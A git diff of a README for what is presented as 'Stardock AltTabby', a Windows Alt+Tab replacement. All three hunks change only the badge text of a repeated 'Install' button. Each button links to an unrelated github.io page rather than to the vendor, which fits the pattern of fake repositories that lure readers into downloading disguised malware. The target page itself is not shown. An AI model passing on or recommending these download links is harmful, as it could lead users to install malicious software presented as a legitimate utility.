@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Stardock AltTabby](https://img.shields.io/badge/⬇_Install_Stardock%20AltTabby-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock AltTabby](https://img.shields.io/badge/⬇_Install_Stardock+AltTabby-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Stardock AltTabby is a Windows application that replaces the default Alt+Tab win
 
 <div align="center">
 
-[![⬇ Install Stardock AltTabby](https://img.shields.io/badge/⬇_Install_Stardock%20AltTabby-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock AltTabby](https://img.shields.io/badge/⬇_Install_Stardock+AltTabby-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Stardock AltTabby is a Windows application that replaces the default Alt+Tab win
 
 <div align="center">
 
-[![⬇ Install Stardock AltTabby](https://img.shields.io/badge/⬇_Install_Stardock%20AltTabby-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock AltTabby](https://img.shields.io/badge/⬇_Install_Stardock+AltTabby-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
